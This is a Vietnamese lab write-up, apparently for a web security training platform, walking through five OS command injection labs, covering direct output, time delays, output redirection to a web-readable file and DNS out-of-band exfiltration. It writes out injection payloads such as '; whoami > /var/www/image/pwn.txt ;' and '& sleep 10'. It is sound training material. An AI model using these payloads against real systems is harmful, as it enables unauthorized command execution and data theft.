## Lab 1: OS command injection, simple case

__OS command injection trường hợp đơn giản__

![2025-11-11-14-26-58](../images/2025-11-11-14-26-58.png)
---
 
Lab yêu cầu khai thác lỗi `OS command injection` yêu cầu thực thi lệnh `whoami` xác định user hiện tại
 
---
![2025-11-11-14-42-32](../images/2025-11-11-14-42-32.png)
---
 
Thử ở trên `/product` với `/product?productId=1;pwd` để thực thi lệnh `pwd`
--> Nhưng không thành công `"Invalid product ID"`
 
---
![2025-11-11-14-44-16](../images/2025-11-11-14-44-16.png)
---
 
Thử với `/product/stock` thì thành công khi server trả về kết quả của lệnh `pwd`
--> Kết quả: `/home/peter-yNQErf`
 
---
![2025-11-11-14-46-22](../images/2025-11-11-14-46-22.png)
---
 
Thay đổi thành `whoami` để lấy user hiện tại
--> Kết quả: `peter-dKEcWb`
 
---
![2025-11-11-14-47-02](../images/2025-11-11-14-47-02.png)

## Lab 2: Blind OS command injection with time delays

__OS command injection mù với độ trễ thời gian__

![2025-11-11-14-52-44](../images/2025-11-11-14-52-44.png)
---
 
Chèn payload như test `&sleep 10 &` vào trường feedback để ép server chậm phản hồi. Gửi form, thấy phản hồi trễ `10` giây là hoàn thành.
 
---

![2025-11-11-15-29-06](../images/2025-11-11-15-29-06.png)
---
 
Chèn payload `& sleep 10` vào tham số `name`
--> Server gần như phản hồi ngay lập tức\
--> Không thực hiện được lệnh `sleep 10`
 
---

![2025-11-11-15-28-07](../images/2025-11-11-15-28-07.png)
---
 
Chèn payload `& sleep 10` vào tham số `email`
--> Server gần như phản hồi rất lâu\
--> Khi server phản hồi thì thấy thời gian trễ khoảng `10` giây\
--> Thực thi được lệnh `sleep 10`
 
---
![2025-11-11-15-31-47](../images/2025-11-11-15-31-47.png)

## Lab 3: Blind OS command injection with output redirection

__OS command injection mù với chuyển hướng đầu ra__

![2025-11-11-15-33-19](../images/2025-11-11-15-33-19.png)
---
 
Lab này tồn tại lỗ hổng `OS command injection` ở trang `feedback`\
Lab yêu cầu chuyển hướng đầu ra của lệnh `whoami` vào một file để đọc trog `/var/www/images/`\
 
---
![2025-11-11-15-41-25](../images/2025-11-11-15-41-25.png)
---
 
Lấy một rq mẫu
 
---
![2025-11-11-15-44-13](../images/2025-11-11-15-44-13.png)
---
 
Chèn payload vào tham số `email` và thấy web phản hồi chậm hơn
 
---
![2025-11-11-16-05-35](../images/2025-11-11-16-05-35.png)
---
 
Thay bằng payload có thể đẩy nội dung ra file
`; whoami > /var/www/image/pwn.txt ;`
 
---
![2025-11-11-16-05-49](../images/2025-11-11-16-05-49.png)
---
 
Truy cập vào `https://0aea009703f939f4807058b900a100d3.web-security-academy.net/image/?filename=pwn.txt`
--> Lấy được user hiện tại: `peter-x3WSbC`
 
---
![2025-11-11-16-07-18](../images/2025-11-11-16-07-18.png)

## Lab 4: Blind OS command injection with out-of-band interaction

__OS command injection mù với tương tác ngoài băng thông__

![2025-11-11-16-22-30](../images/2025-11-11-16-22-30.png)
---
 
Lab có lỗ hổng `OS command injection` ở trang `feed back`\
Không thể truy cập đến vùng chuyển hướng ra\
Nhưng có thể sử dụng để truy cập OOB

---
![2025-11-11-16-53-12](../images/2025-11-11-16-53-12.png)
---
 
Viết payload chèn lệnh `nslookup ...` để gọi đến domain
 
---
![2025-11-11-16-55-49](../images/2025-11-11-16-55-49.png)
---
 
Sang `Burp Collaborator` xem và thấy có 2 rq `DNS` được gọi về domain
 
---
![2025-11-11-16-55-19](../images/2025-11-11-16-55-19.png)

## Lab 5: Blind OS command injection with out-of-band data exfiltration

__OS command injection mù với rò rỉ dữ liệu ngoài băng thông__

![2025-11-11-16-57-13](../images/2025-11-11-16-57-13.png)
---
 
Lab yêu cầu trích xuất thông tin của user bằng `whoami` và nối vào đầu của domain
 
---
![2025-11-11-17-13-48](../images/2025-11-11-17-13-48.png)
---
 
Gán cho biến `t` là output của lệnh `whoami`\
Sau đó truy vấn đến domain
 
---
![2025-11-11-17-15-31](../images/2025-11-11-17-15-31.png)
---
 
--> `peter-GhaSIO`
 
---
![2025-11-11-17-16-41](../images/2025-11-11-17-16-41.png)
